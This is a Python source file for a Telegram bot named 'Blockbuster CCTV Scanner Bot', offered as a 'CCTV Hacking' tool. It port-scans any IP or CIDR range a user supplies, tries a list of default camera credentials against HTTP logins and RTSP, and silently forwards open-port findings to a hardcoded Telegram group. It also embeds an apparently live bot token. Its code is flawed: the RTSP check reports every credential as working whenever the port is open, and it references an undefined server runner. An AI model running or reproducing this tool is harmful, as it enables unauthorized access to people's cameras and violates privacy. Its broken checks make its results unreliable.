import socket
import ipaddress
import re
import concurrent.futures
import requests
import time
import os
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
from telegram.error import NetworkError, BadRequest
from aiohttp import web

# Hardcoded bot token
BOT_TOKEN = "8049406807:AAGhuUh9fOm5wt7OvTobuRngqY0ZNBMxlHE"
# Placeholder group ID (replace with actual group ID)
GROUP_ID = "-1002522049841"  # Replace with actual group ID

# Global data storage
scan_results = {}
scan_locks = {}
message_ids = {}
scan_stop = {}
last_message_state = {}
awaiting_input = {}
recent_scans = []  # Store recent scan results

# Common CCTV ports (TCP) and UDP ports
CCTV_PORTS = [80, 554, 8000, 8080, 8443]
UDP_PORTS = [37020]  # ONVIF discovery

# Port to service mapping
SERVICE_MAP = {
    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 80: "http",
    110: "pop3", 143: "imap", 443: "https", 445: "smb", 3389: "rdp",
    53: "dns", 3306: "mysql", 5432: "postgresql", 8080: "http-alt",
    554: "rtsp", 8000: "http-alt", 8443: "https-alt", 37020: "onvif"
}

# Extended default credentials
DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "12345"), ("admin", ""),
    ("root", "root"), ("root", ""), ("admin", "666666"),
    ("admin", "password"), ("user", "user")
]

# Known vulnerabilities
VULN_ALERTS = {
    80: "HTTP port open. Vulnerable to default credential brute-forcing. Change default passwords and enable MFA.",
    554: "RTSP port open. Unsecured streams may allow unauthorized video access. Secure with authentication.",
    8080: "HTTP-alt port open. Often used by CCTV web interfaces. Update firmware to patch vulnerabilities.",
    8000: "HTTP-alt port open. Check for weak credentials and update firmware.",
    8443: "HTTPS-alt port open. Ensure SSL certificates are valid and credentials are strong.",
    37020: "ONVIF discovery (UDP). May expose camera details. Restrict network access."
}

# HTTP server for health checks
async def health_check(request):
    return web.Response(text="OK")

async def start_http_server():
    app = web.Application()
    app.add_routes([web.get('/health', health_check)])
    port = int(os.getenv("PORT", 8080))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"[{time.ctime()}] HTTP server started on port {port}")
    return runner  # Return runner for cleanup

# Validate IP address
def is_valid_ip(ip):
    pattern = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    return re.match(pattern, ip) is not None

# Detect camera model via HTTP
def detect_camera_model(ip, port):
    try:
        url = f"http://{ip}:{port}"
        response = requests.get(url, timeout=5, allow_redirects=False)
        headers = response.headers
        server = headers.get("Server", "Unknown")
        title = re.search(r"<title>(.*?)</title>", response.text, re.I)
        title = title.group(1) if title else "Unknown"
        return f"Server: {server}, Page Title: {title}"
    except Exception as e:
        print(f"[{time.ctime()}] Error detecting camera model on {ip}:{port}: {e}")
        return "Unknown"

# Test default credentials (HTTP)
def test_default_creds(ip, port):
    results = []
    for username, password in DEFAULT_CREDS:
        try:
            url = f"http://{ip}:{port}/login"
            response = requests.post(url, data={"username": username, "password": password}, timeout=5)
            if response.status_code == 200 and "login failed" not in response.text.lower():
                results.append(f"✅ Success: {username}:{password}")
            else:
                results.append(f"❌ Failed: {username}:{password}")
        except Exception as e:
            print(f"[{time.ctime()}] Error testing creds {username}:{password} on {ip}:{port}: {e}")
            results.append(f"❌ Error: {username}:{password}")
    return results

# Test RTSP brute-forcing
def test_rtsp_brute(ip, port):
    results = []
    for username, password in DEFAULT_CREDS:
        try:
            rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/live"
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((ip, port))
            sock.close()
            if result == 0:
                results.append(f"✅ RTSP Success: {username}:{password} (try {rtsp_url})")
            else:
                results.append(f"❌ RTSP Failed: {username}:{password}")
        except Exception as e:
            print(f"[{time.ctime()}] Error testing RTSP creds {username}:{password} on {ip}:{port}: {e}")
            results.append(f"❌ RTSP Error: {username}:{password}")
    return results

# Test ONVIF protocol
def test_onvif(ip, port):
    try:
        url = f"http://{ip}:{port}/onvif/device_service"
        response = requests.get(url, timeout=5)
        return "ONVIF supported" if response.status_code == 200 else "ONVIF not detected"
    except Exception as e:
        print(f"[{time.ctime()}] Error testing ONVIF on {ip}:{port}: {e}")
        return "Error testing ONVIF"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    keyboard = [
        [InlineKeyboardButton("🌐 IP Scanning (All 65,535 Ports)", callback_data=f"ip_scan_{chat_id}")],
        [InlineKeyboardButton("🎥 CCTV Hacking", callback_data=f"cctv_hack_{chat_id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🎥 **Blockbuster CCTV Scanner Bot** 🎬\n\n"
        "Choose an option:\n"
        "🌐 **IP Scanning**: Scan all 65,535 TCP ports (~10-20 min)\n"
        "🎥 **CCTV Hacking**: Scan CCTV ports & brute-force RTSP (~1-2 sec)\n"
        "⚠️ **Only scan systems you have permission for!**",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    if chat_id in scan_locks and scan_locks[chat_id]:
        scan_stop[chat_id] = True
        await update.message.reply_text("🛑 Scan stopping... Please wait.")
    else:
        await update.message.reply_text("⚠️ No scan in progress.")

async def get_ports(update: Update, context: ContextTypes.DEFAULT_TYPE):
    current_time = time.time()
    valid_results = [res for res in recent_scans if current_time - res["timestamp"] <= 24 * 3600]
    if valid_results:
        result = "Recent scan results:\n"
        for res in valid_results:
            ports = [f"{port} ({proto})" for port, proto in res["open"]]
            result += f"IP: {res['ip']}, Open ports: {', '.join(ports)}, Scanned: {time.ctime(res['timestamp'])}\n"
    else:
        result = "No recent scan results available (within 24 hours)."
    await update.message.reply_text(result)

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    scan_count = len(recent_scans)
    await update.message.reply_text(f"Bot Stats:\nTotal Scans: {scan_count}")

# Port scanner function
def scan_port(ip, port, chat_id, protocol="tcp"):
    if scan_stop.get(chat_id, False):
        return None
    try:
        sock_type = socket.SOCK_DGRAM if protocol == "udp" else socket.SOCK_STREAM
        sock = socket.socket(socket.AF_INET, sock_type)
        sock.settimeout(0.3 if protocol == "tcp" else 1.0)
        result = sock.connect_ex((ip, port))
        sock.close()
        return port, result == 0, protocol
    except Exception as e:
        print(f"[{time.ctime()}] Error scanning port {port} ({protocol}): {e}")
        return None

# Single IP scan
async def scan_single_ip(ip, chat_id, update, context, is_cctv=False):
    if not is_valid_ip(ip):
        await update.message.reply_text(f"⚠️ Invalid IP: {ip}")
        return

    scan_results[chat_id] = {"open": [], "closed_count": 0, "details": {}}
    scan_locks[chat_id] = True
    scan_stop[chat_id] = False

    # Set ports based on scan type
    if is_cctv:
        scan_ports = [(p, "tcp") for p in CCTV_PORTS] + [(p, "udp") for p in UDP_PORTS]
        eta_text = "~1-2 sec"
    else:
        scan_ports = [(p, "tcp") for p in range(1, 65536)] + [(p, "udp") for p in UDP_PORTS]
        eta_text = "~10-20 min"
    total_ports = len(scan_ports)

    print(f"[{time.ctime()}] Scanning {ip}: {total_ports} ports ({len(scan_ports) - len(UDP_PORTS)} TCP + {len(UDP_PORTS)} UDP)")

    start_time = time.time()
    msg = await update.message.reply_text(
        f"🔍 Scanning **{ip}** [0%] (ETA: {eta_text}, {total_ports} ports)",
        parse_mode="Markdown"
    )
    message_ids[chat_id] = msg.message_id
    last_message_state[chat_id] = {"text": "", "open": 0, "closed": 0}

    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(scan_port, ip, port, chat_id, proto) for port, proto in scan_ports]
        completed = 0
        update_interval = max(total_ports // 10, 1000)
        for future in concurrent.futures.as_completed(futures):
            if scan_stop.get(chat_id, False):
                break
            result = future.result()
            completed += 1
            if result:
                port, is_open, protocol = result
                if is_open:
                    scan_results[chat_id]["open"].append((port, protocol))
                    details = {}
                    if protocol == "tcp" and port in [80, 8080, 8000, 8443]:
                        details["model"] = detect_camera_model(ip, port)
                        details["creds"] = test_default_creds(ip, port)
                        details["onvif"] = test_onvif(ip, port)
                    if protocol == "tcp" and port == 554 and is_cctv:
                        details["rtsp"] = test_rtsp_brute(ip, port)
                    if protocol == "udp" and port == 37020:
                        details["onvif"] = "ONVIF discovery active (UDP)"
                    scan_results[chat_id]["details"][(port, protocol)] = details
                else:
                    scan_results[chat_id]["closed_count"] += 1
            if completed % update_interval == 0:
                progress = (completed / total_ports) * 100
                elapsed = time.time() - start_time
                eta = (elapsed / completed * total_ports - elapsed) if completed > 0 else 0
                await update_buttons(chat_id, context, ip, progress, eta if not is_cctv else 0)

    if scan_stop.get(chat_id, False):
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_ids[chat_id],
            text=f"🛑 Scan stopped for **{ip}**", parse_mode="Markdown"
        )
    else:
        await update_buttons(chat_id, context, ip, 100, 0)
        # Auto-send to group
        if scan_results[chat_id]["open"]:
            ports = [f"{port} ({proto})" for port, proto in scan_results[chat_id]["open"]]
            group_msg = f"Scan result for {ip}:\nOpen ports: {', '.join(ports)}\nScanned: {time.ctime()}"
            try:
                await context.bot.send_message(chat_id=GROUP_ID, text=group_msg)
                print(f"[{time.ctime()}] Sent scan result to group {GROUP_ID}")
            except Exception as e:
                print(f"[{time.ctime()}] Error sending to group: {str(e)}")
        # Store scan result
        recent_scans.append({
            "ip": ip,
            "open": scan_results[chat_id]["open"],
            "timestamp": time.time()
        })

    scan_locks[chat_id] = False
    scan_stop.pop(chat_id, None)
    message_ids.pop(chat_id, None)
    last_message_state.pop(chat_id, None)
    awaiting_input.pop(chat_id, None)

# CIDR Range scan
async def scan_cidr(cidr, chat_id, update, context, is_cctv=False):
    try:
        net = ipaddress.ip_network(cidr, strict=False)
        await update.message.reply_text(
            f"🌐 Scanning **{cidr}** ({net.num_addresses} IPs)...", parse_mode="Markdown"
        )
        for ip in net.hosts():
            if scan_stop.get(chat_id, False):
                break
            await scan_single_ip(str(ip), chat_id, update, context, is_cctv=is_cctv)
    except Exception as e:
        await update.message.reply_text(f"⚠️ Error: {str(e)}")
        scan_locks[chat_id] = False

# Live button updater
async def update_buttons(chat_id, context, ip, progress, eta):
    open_ports = len(scan_results.get(chat_id, {}).get("open", []))
    closed_ports = scan_results.get(chat_id, {}).get("closed_count", 0)
    eta_text = f", ETA: {int(eta // 60)}m {int(eta % 60)}s" if eta > 0 else ""
    progress_text = f"🔍 Scanning **{ip}** [{progress:.1f}%{eta_text}]"

    last_state = last_message_state.get(chat_id, {"text": "", "open": -1, "closed": -1})
    if (last_state["text"] == progress_text and
        last_state["open"] == open_ports and
        last_state["closed"] == closed_ports):
        return

    keyboard = [
        [InlineKeyboardButton(f"🟢 Open Ports: {open_ports}", callback_data=f"open_{chat_id}")],
        [InlineKeyboardButton(f"🔴 Closed Ports: {closed_ports}", callback_data=f"closed_{chat_id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_ids[chat_id],
            text=progress_text,
            parse_mode="Markdown",
            reply_markup=reply_markup
        )
        last_message_state[chat_id] = {"text": progress_text, "open": open_ports, "closed": closed_ports}
    except Exception as e:
        if "Message is not modified" not in str(e):
            print(f"[{time.ctime()}] Error updating buttons: {e}")

# Button click handler
async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat_id

    print(f"[{time.ctime()}] Button clicked: chat_id={chat_id}, data={query.data}, scan_results_keys={list(scan_results.keys())}")

    try:
        if query.data.startswith("ip_scan_"):
            awaiting_input[chat_id] = "ip_scan"
            await query.message.reply_text(
                "🌐 Enter an IP or CIDR range for full 65,535 port scan (e.g., `192.168.1.1` or `192.168.1.0/24`):",
                parse_mode="Markdown"
            )
        elif query.data.startswith("cctv_hack_"):
            awaiting_input[chat_id] = "cctv_hack"
            await query.message.reply_text(
                "🎥 Enter an IP for CCTV hacking (e.g., `192.168.1.1`):",
                parse_mode="Markdown"
            )
        elif query.data.startswith(("open_", "closed_")):
            action, button_chat_id = query.data.split("_", 1)
            print(f"[{time.ctime()}] Action: {action}, Button chat_id: {button_chat_id}")

            if button_chat_id != str(chat_id):
                await query.message.reply_text("⚠️ Chat ID mismatch. Please start a new scan.")
                return

            if chat_id not in scan_results:
                await query.message.reply_text("⚠️ Scan data expired or not found. Please start a new scan.")
                return

            if action == "open":
                open_ports = scan_results[chat_id].get("open", [])
                if not open_ports:
                    await query.message.reply_text("🟢 No Open Ports Found!")
                else:
                    ports_text = []
                    for port, protocol in sorted(open_ports)[:50]:
                        port_info = f"✅ Port {port} ({protocol.upper()}): {SERVICE_MAP.get(port, 'unknown')} (open)"
                        if (port, protocol) in scan_results[chat_id]["details"]:
                            details = scan_results[chat_id]["details"][(port, protocol)]
                            if "model" in details:
                                port_info += f"\n  - Model: {details['model']}"
                            if "creds" in details:
                                port_info += f"\n  - HTTP Credentials: {', '.join(details['creds'])}"
                            if "rtsp" in details:
                                port_info += f"\n  - RTSP Brute: {', '.join(details['rtsp'])}"
                            if "onvif" in details:
                                port_info += f"\n  - ONVIF: {details['onvif']}"
                        if port in VULN_ALERTS:
                            port_info += f"\n  - ⚠️ {VULN_ALERTS[port]}"
                        ports_text.append(port_info)
                    await query.message.reply_text(
                        f"**🟢 Open Ports (Top {min(len(open_ports), 50)}):**\n" + "\n".join(ports_text),
                        parse_mode="Markdown"
                    )
                scan_results.pop(chat_id, None)

            elif action == "closed":
                closed_count = scan_results[chat_id].get("closed_count", 0)
                if closed_count == 0:
                    await query.message.reply_text("🔴 No Closed Ports Found!")
                else:
                    await query.message.reply_text(
                        f"**🔴 Closed Ports:** {closed_count}\n(Too many to list individually)", parse_mode="Markdown"
                    )

    except Exception as e:
        print(f"[{time.ctime()}] Error in button_click: {e}")
        await query.message.reply_text(f"⚠️ Error processing button: {str(e)}")

# Handle user input
async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    if scan_locks.get(chat_id, False):
        await update.message.reply_text("⚙️ Scan in progress... please wait for it to complete!")
        return

    if chat_id not in awaiting_input:
        await update.message.reply_text("⚠️ Please use /start to choose an option.")
        return

    target = update.message.text.strip()
    mode = awaiting_input[chat_id]

    if mode == "ip_scan":
        if "/" in target:
            await scan_cidr(target, chat_id, update, context, is_cctv=False)
        else:
            await scan_single_ip(target, chat_id, update, context, is_cctv=False)
    elif mode == "cctv_hack":
        if "/" not in target:
            await scan_single_ip(target, chat_id, update, context, is_cctv=True)
        else:
            await update.message.reply_text("⚠️ CCTV hacking supports single IPs only. Use `192.168.1.1`.")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"[{time.ctime()}] Error: {context.error}")
    if isinstance(context.error, NetworkError):
        await asyncio.sleep(5)
    elif isinstance(context.error, BadRequest):
        print(f"[{time.ctime()}] BadRequest: {context.error}")

async def main():
    print(f"[{time.ctime()}] Bot starting...")
    try:
        app = ApplicationBuilder().token(BOT_TOKEN).build()
        print(f"[{time.ctime()}] Bot initialized with token: {BOT_TOKEN[:10]}...")
    except Exception as e:
        print(f"[{time.ctime()}] Error initializing bot: {str(e)}")
        raise

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CommandHandler("getports", get_ports))
    app.add_handler(CommandHandler("info", info))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, scan))
    app.add_handler(CallbackQueryHandler(button_click))
    app.add_error_handler(error_handler)

    # Start HTTP server
    await app.initialize()
    await app.start()
    await app.updater.start_polling(allowed_updates=Update.ALL_TYPES)
    print(f"[{time.ctime()}] Bot polling started")

    # Keep running until interrupted
    try:
        while True:
            await asyncio.sleep(3600)  # Sleep to keep loop alive
    except (KeyboardInterrupt, SystemExit):
        print(f"[{time.ctime()}] Shutting down...")
        await app.updater.stop()
        await app.stop()
        await app.shutdown()
        await http_runner.cleanup()
        print(f"[{time.ctime()}] Shutdown complete")

if __name__ == "__main__":
    asyncio.run(main())
